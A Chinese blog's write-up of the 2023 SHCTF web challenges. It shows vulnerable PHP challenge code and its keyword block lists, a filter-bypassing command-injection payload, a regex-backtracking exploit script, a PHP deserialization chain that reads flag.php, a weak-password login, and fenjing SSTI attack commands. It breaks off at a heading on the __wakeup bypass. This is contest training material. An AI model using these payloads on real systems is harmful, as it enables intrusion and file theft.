<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.7.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.7.0" type="image/png" sizes="32x32"><meta name="description" content="2023SHCTF">
<meta property="og:type" content="article">
<meta property="og:title" content="2023SHCTF">
<meta property="og:url" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/index.html">
<meta property="og:site_name" content="hey&#39;s blog">
<meta property="og:description" content="2023SHCTF">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/1.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/3.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/2.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/4.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/6.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/13.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/14.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/15.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/16.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/17.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/18.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/19.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/21.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/20.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/22.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/23.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/24.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/8.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/9.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/10.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/11.png">
<meta property="og:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/12.png">
<meta property="article:published_time" content="2023-10-05T01:23:36.000Z">
<meta property="article:modified_time" content="2023-11-06T14:42:14.871Z">
<meta property="article:author" content="hey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hyggevv.github.io/2023/10/05/2023SHCTF/1.png"><title>2023SHCTF | hey's blog</title><link ref="canonical" href="https://hyggevv.github.io/2023/10/05/2023SHCTF/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.7.0"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"carbon","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copiar","copySuccess":"Éxito en copia","copyError":"Error en copia"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Inicio</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archivos</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categorías</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Etiquetas</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">Sobre Nosotros</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/read/"><span class="header-nav-menu-item__icon"><i class="fas fa-book"></i></span><span class="header-nav-menu-item__text">menu.read</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">hey's blog</div><div class="header-banner-info__subtitle">天气转晴太阳崭新我在前进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">2023SHCTF</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Creado</span><span class="post-meta-item__value">2023-10-05</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Actualizado</span><span class="post-meta-item__value">2023-11-06</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visitado</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
        <h1 id="WEB">
          <a href="#WEB" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1>
      
        <h2 id="WEEK1-babyRCE">
          <a href="#WEEK1-babyRCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h2>
      
        <h3 id="源码审计">
          <a href="#源码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>此时注意到<code>\$</code>都没有被过滤，所以此时针对其对关键字的过滤可以使用<code>\</code>进行绕过</p>

        <h3 id="payload">
          <a href="#payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload" class="headerlink" title="payload"></a>payload</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rce=ca\t$IFS/fla\g</span><br></pre></td></tr></table></div></figure>


        <h2 id="WEEK1-1zzphp">
          <a href="#WEEK1-1zzphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2>
      
        <h3 id="源码审计-1">
          <a href="#源码审计-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;./index.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$code</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;c_ode&#x27;</span>];</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no number!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?SHCTF/is&#x27;</span>, <span class="variable">$code</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no touch!&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$code</span>,<span class="string">&#x27;2023SHCTF&#x27;</span>) === <span class="literal">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;what do you want&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></div></figure>
<p>此时其对我们输入的<code>num</code>进行检查是否包含数字，此时可以使用数组进行绕过；而看到<code>preg_match(&#39;/.+?SHCTF/is&#39;, $code)</code>我们就知道是回溯绕过</p>

        <h3 id="exp">
          <a href="#exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">&quot;1&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;2023SHCTF&#x27;</span></span><br><span class="line">response = requests.post(<span class="string">&quot;http://112.6.51.212:32812/?num[]=1&quot;</span>, data=&#123;<span class="string">&quot;c_ode&quot;</span>:payload&#125;)</span><br><span class="line">content = response.text</span><br><span class="line"><span class="built_in">print</span>(content)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/10/05/2023SHCTF/1.png"></p>

        <h2 id="WEEK1-ez-serialize">
          <a href="#WEEK1-ez-serialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h2>
      
        <h3 id="源码审计-2">
          <a href="#源码审计-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;var_1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;q)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;           </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;z-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
<p>反序列化的题目就是将一整条链子捋清楚，先确定链尾然后一直反推到链首；此时我们观察源码发现在A类的invoke魔术方法中存在include()函数，此时我们可以利用这个文件包含来读取flag，接下来就是如何触发invoke()；我们知道当一个对象被当作函数的形式调用时会触发invoke(),所以此时我们可以定位到D类的get()魔术方法中的<code>$function = $this-&gt;p;return $function();</code>；而此时get()的调用方式则是当访问一个不存在或者没有权限<br>访问的对象时触发此时我们可以定位到C类的中的toString()的<code>return $this-&gt;z-&gt;var;</code>;而toString()的触发方式则是触发字符串，那么此时刚好和<br>wakeup()中的echo对应，那么此时我们就可以得到我们需要构造的反序列化链</p>

        <h3 id="反序列化链">
          <a href="#反序列化链" class="heading-link"><i class="fas fa-link"></i></a><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B__wakeup()  --&gt;  C__toString()  --&gt;  D__get()  --&gt;  A__invoke()</span><br></pre></td></tr></table></div></figure>

        <h3 id="exp-1">
          <a href="#exp-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var_1</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$a</span> -&gt; q = <span class="keyword">new</span> C;</span><br><span class="line"><span class="variable">$a</span> -&gt; q -&gt; z = <span class="keyword">new</span> D;</span><br><span class="line"><span class="variable">$a</span> -&gt; q -&gt; z -&gt; p = <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/10/05/2023SHCTF/3.png"></p>

        <h3 id="payload-1">
          <a href="#payload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:1:&#123;s:1:&quot;q&quot;;O:1:&quot;C&quot;:2:&#123;s:3:&quot;var&quot;;N;s:1:&quot;z&quot;;O:1:&quot;D&quot;:1:&#123;s:1:&quot;p&quot;;O:1:&quot;A&quot;:1:&#123;s:5:&quot;var_1&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="WEEK1-登录就给flag">
          <a href="#WEEK1-登录就给flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-登录就给flag" class="headerlink" title="[WEEK1]登录就给flag"></a>[WEEK1]登录就给flag</h2>
      
        <h3 id="rockyou">
          <a href="#rockyou" class="heading-link"><i class="fas fa-link"></i></a><a href="#rockyou" class="headerlink" title="rockyou"></a>rockyou</h3>
      <p>username&#x3D;admin&amp;password&#x3D;password<br><img src="/2023/10/05/2023SHCTF/2.png"></p>

        <h2 id="WEEK1-飞机大战">
          <a href="#WEEK1-飞机大战" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h2>
      
        <h3 id="JS">
          <a href="#JS" class="heading-link"><i class="fas fa-link"></i></a><a href="#JS" class="headerlink" title="JS"></a>JS</h3>
      <p>此时我们看到这种前端类型的题目此时可以直接到JS文件中查找关键字<code>flag alert ctf ...</code><br><img src="/2023/10/05/2023SHCTF/4.png"><br>此时unicode解码后在base64解码即可获得flag</p>

        <h2 id="WEEK1-生成你的邀请函吧">
          <a href="#WEEK1-生成你的邀请函吧" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a>[WEEK1]生成你的邀请函吧~</h2>
      <p>post发送一个josn格式的请求包即可<br><img src="/2023/10/05/2023SHCTF/6.png"></p>

        <h2 id="WEEK2-ez-ssti">
          <a href="#WEEK2-ez-ssti" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK2-ez-ssti" class="headerlink" title="[WEEK2]ez_ssti"></a>[WEEK2]ez_ssti</h2>
      <p>此时题目已经给出了考点了，那么此时我们考虑可以使用自动化工具</p>

        <h3 id="fenjing自动化">
          <a href="#fenjing自动化" class="heading-link"><i class="fas fa-link"></i></a><a href="#fenjing自动化" class="headerlink" title="fenjing自动化"></a>fenjing自动化</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">各个功能的介绍：</span><br><span class="line"></span><br><span class="line">webui: 网页UI</span><br><span class="line">顾名思义，网页UI</span><br><span class="line">默认端口11451</span><br><span class="line">scan: 扫描整个网站</span><br><span class="line">从网站中根据form元素提取出所有的表单并攻击</span><br><span class="line">扫描成功后会提供一个模拟终端或执行给定的命令</span><br><span class="line">示例：python -m fenjing scan --url &#x27;http://xxx/&#x27;</span><br><span class="line">crack: 对某个特定的表单进行攻击</span><br><span class="line">需要指定表单的url, action(GET或POST)以及所有字段(比如&#x27;name&#x27;)</span><br><span class="line">攻击成功后也会提供一个模拟终端或执行给定的命令</span><br><span class="line">示例：python -m fenjing crack --url &#x27;http://xxx/&#x27; --method GET --inputs name</span><br><span class="line">crack-path: 对某个特定的路径进行攻击</span><br><span class="line">攻击某个路径（如http://xxx.xxx/hello/&lt;payload&gt;）存在的漏洞</span><br><span class="line">参数大致上和crack相同，但是只需要提供对应的路径</span><br><span class="line">示例：python -m fenjing crack-path --url &#x27;http://xxx/hello/&#x27;</span><br><span class="line">get-config: 对某个特定的表单进行攻击，但是只获取flask config</span><br><span class="line">参数大致上和crack相同</span><br></pre></td></tr></table></div></figure>
<p>使用命令<code>python3 -m fenjing crack --url &#39;http://112.6.51.212:30241/&#39; --method GET --inputs name</code>进行攻击<br><img src="/2023/10/05/2023SHCTF/13.png"><br><img src="/2023/10/05/2023SHCTF/14.png"></p>

        <h2 id="WEEK2-EasyCMS">
          <a href="#WEEK2-EasyCMS" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK2-EasyCMS" class="headerlink" title="[WEEK2]EasyCMS"></a>[WEEK2]EasyCMS</h2>
      
        <h3 id="指纹识别">
          <a href="#指纹识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3>
      <p><img src="/2023/10/05/2023SHCTF/15.png"><br>此时一眼即为<code>Taocms</code>;谨慎一点使用指纹识别工具进行验证<br><img src="/2023/10/05/2023SHCTF/16.png"></p>

        <h3 id="Taocms-代码注入漏洞">
          <a href="#Taocms-代码注入漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#Taocms-代码注入漏洞" class="headerlink" title="Taocms 代码注入漏洞"></a>Taocms 代码注入漏洞</h3>
      <p>那么此时我们就知道这题的考点在于Taocms的nday或1day漏洞利用了；根据这篇文章<br><code>https://blog.csdn.net/huayimy/article/details/127611217</code><br>可以获得flag<br><img src="/2023/10/05/2023SHCTF/17.png"></p>

        <h2 id="WEEK2-no-wake-up">
          <a href="#WEEK2-no-wake-up" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEEK2-no-wake-up" class="headerlink" title="[WEEK2]no_wake_up"></a>[WEEK2]no_wake_up</h2>
      
        <h3 id="代码审计">
          <a href="#代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;try&#x27;</span>]); </span><br></pre></td></tr></table></div></figure>

        <h3 id="wakeup的绕过">
